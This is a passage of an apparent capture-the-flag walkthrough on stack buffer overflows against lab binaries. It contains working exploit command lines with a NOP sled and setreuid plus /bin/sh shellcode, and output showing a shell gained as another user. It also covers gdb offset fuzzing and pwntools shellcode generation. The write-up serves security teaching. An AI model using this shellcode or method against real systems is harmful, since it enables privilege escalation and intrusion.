plain">ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ1ÔøΩfÔøΩÔøΩjqXHÔøΩÔøΩj;XH1ÔøΩIÔøΩ//bin/shIAPHÔøΩÔøΩRWHÔøΩÔøΩj&lt;XH1ÔøΩAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ exit</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c &quot;print &#x27;\x90&#x27;*86+&#x27;\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;B&#x27;*12 + &#x27;\x68\xe2\xff\xff\xff\x7f&#x27;&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ  ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ1ÔøΩfÔøΩÔøΩjqXHÔøΩÔøΩj;XH1ÔøΩIÔøΩ//bin/shIAPHÔøΩÔøΩRWHÔøΩÔøΩj&lt;XH1ÔøΩBBBBBBBBBBBBhÔøΩÔøΩÔøΩÔøΩ</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Illegal instruction</span><br></span></code></pre></div></div>
<p>ended up being my return address <code>\x68\xe2\xff\xff\xff\x7f</code> didn&#x27;t work, but <code>\x98\xe2\xff\xff\xff\x7f</code> did.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c &quot;print &#x27;\x90&#x27;*86+&#x27;\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;B&#x27;*12 + &#x27;\x98\xe2\xff\xff\xff\x7f&#x27;&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ1ÔøΩfÔøΩÔøΩjqXHÔøΩÔøΩj;XH1ÔøΩIÔøΩ//bin/shIAPHÔøΩÔøΩRWHÔøΩÔøΩj&lt;XH1ÔøΩBBBBBBBBBBBBÔøΩÔøΩÔøΩÔøΩÔøΩ</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ whoami</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">user2</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ ls</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">buffer-overflow  buffer-overflow.c  secret.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ cat secret.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">omgyoudidthissocool!!</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="buffer-overflow-2">Buffer Overflow #2<a href="#buffer-overflow-2" class="hash-link" aria-label="Direct link to Buffer Overflow #2" title="Direct link to Buffer Overflow #2">‚Äã</a></h2>
<p>The 2nd overflow, in the <code>buffer-overflow-4</code> folder:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token macro property directive-hash" style="color:rgb(128, 203, 196)">#</span><span class="token macro property directive keyword" style="color:rgb(127, 219, 202)">include</span><span class="token macro property" style="color:rgb(128, 203, 196)"> </span><span class="token macro property string" style="color:rgb(173, 219, 103)">&lt;stdio.h /&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token macro property directive-hash" style="color:rgb(128, 203, 196)">#</span><span class="token macro property directive keyword" style="color:rgb(127, 219, 202)">include</span><span class="token macro property" style="color:rgb(128, 203, 196)"> </span><span class="token macro property string" style="color:rgb(173, 219, 103)">&lt;stdlib.h /&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">copy_arg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain">string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">140</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">strcpy</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">printf</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;%s\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">return</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">main</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token keyword" style="color:rgb(127, 219, 202)">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">printf</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Here&#x27;s a program that echo&#x27;s out your input\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">copy_arg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="find-offset">Find Offset<a href="#find-offset" class="hash-link" aria-label="Direct link to Find Offset" title="Direct link to Find Offset">‚Äã</a></h3>
<p>The offset is the size of the payload that includes the &quot;buffer&quot; all the way up to overwriting the EIP (return address)</p>
<p>we can see the entry point for our overflow in the source code:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">154</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;doggo&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token function" style="color:rgb(130, 170, 255)">strcpy</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><br></span></code></pre></div></div>
<p>our equation for the offset, works something like this:</p>
<p><code>payload = buffer + return_address + pad</code> - where <code>pad</code> is some arbitrary number we adjust to see the program &quot;crash&quot; out and show us a return address that starts getting overwritten with <code>&#x27;A&#x27;s</code></p>
<p>e.g.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000414141 in ?? ()</span><br></span></code></pre></div></div>
<p>We can see that <code>buffer</code> is <code>154 - doggo</code> = <code>149</code> - (we&#x27;ll keep writing it as <code>154-5</code>. And we know that the return address is <code>6 bytes</code>.</p>
<p>So now our equation looks like : <code>payload = (154-5) + 6 + pad</code> for which we don&#x27;t know what <code>pad</code> equals, so we run a python line to start determining what <code>pad</code> is.</p>
<p>Let&#x27;s start with <code>8 bytes</code> i.e. <code>(154-5+6+8)</code> and keep incrementing that until we see our <code>A</code>&#x27;s (<code>\x41</code>) start overwriting the return address:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(154-5+6+8)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;A&#x27;*(154-5+6+8)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGILL, Illegal instruction.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000400500 in __do_global_dtors_aux ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(154-5+6+9)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;A&#x27;*(154-5+6+9)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000400041 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(154-5+6+10)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;A&#x27;*(154-5+6+10)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000004141 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(154-5+6+11)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;A&#x27;*(154-5+6+11)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000414141 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(154-5+6+12)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;A&#x27;*(154-5+6+12)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000041414141 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(154-5+6+13)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;A&#x27;*(154-5+6+13)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000004141414141 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000004141414141 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(154-5+6+14)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;A&#x27;*(154-5+6+14)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000414141414141 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(154-5+6+15)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c &quot;print &#x27;A&#x27;*(154-5+6+15)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x00000000004005ab in concat_arg ()</span><br></span></code></pre></div></div>
<p>Once we have 6 x A&#x27;s (<code>\x41</code>) in the return address when the application crashes we have successfully, fully overwritten the EIP (Extended Instruction Pointer i.e. the &quot;what do I execute next?&quot; instruction register). You can see if we go <code>1 byte</code> over, the crashed EIP register is showing no <code>A</code>&#x27;s at all, so our payload has over shot it.</p>
<p><code>Payload = 154-5+6+14 = 169</code> so our entire payload going forward, <strong>must</strong> always be a total of <code>169 bytes</code> to correctly overwrite the EIP so it points to our shellcode.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="shellcode-1">Shellcode<a href="#shellcode-1" class="hash-link" aria-label="Direct link to Shellcode" title="Direct link to Shellcode">‚Äã</a></h3>
<p>We need 2 x particular kinds of shellcode here, 1) <code>/bin/sh</code> shellcode to drop us into a shell and 2) <code>setreuid</code> shellcode to set our UID to that of the user we&#x27;re trying to have the permissions for.</p>
<p><code>/bin/sh</code> = <code>\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="shellcode--pwntools">shellcode + pwntools<a href="#shellcode--pwntools" class="hash-link" aria-label="Direct link to shellcode + pwntools" title="Direct link to shellcode + pwntools">‚Äã</a></h3>
<p>We want shellcode that calls <code>setreuid</code> to set our <code>uid=1003</code> i.e. <code>user3</code> permissions.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">$ pwn shellcraft -f d amd64.linux.setreuid 1003</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05</span><br></span></code></pre></div></div>
<p>total length of shellcode:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">Python </span><span class="token number" style="color:rgb(247, 140, 108)">2.7</span><span class="token number" style="color:rgb(247, 140, 108)">.16</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">default</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> Jul </span><span class="token number" style="color:rgb(247, 140, 108)">19</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2019</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">23</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token number" style="color:rgb(247, 140, 108)">05</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token number" style="color:rgb(247, 140, 108)">17</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">GCC </span><span class="token number" style="color:rgb(247, 140, 108)">7.3</span><span class="token number" style="color:rgb(247, 140, 108)">.1</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">20180712</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">Red Hat </span><span class="token number" style="color:rgb(247, 140, 108)">7.3</span><span class="token number" style="color:rgb(247, 140, 108)">.1</span><span class="token operator" style="color:rgb(127, 219, 202)">-</span><span class="token number" style="color:rgb(247, 140, 108)">6</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> on linux2</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Type </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;help&quot;</span><span class="token punctuation" 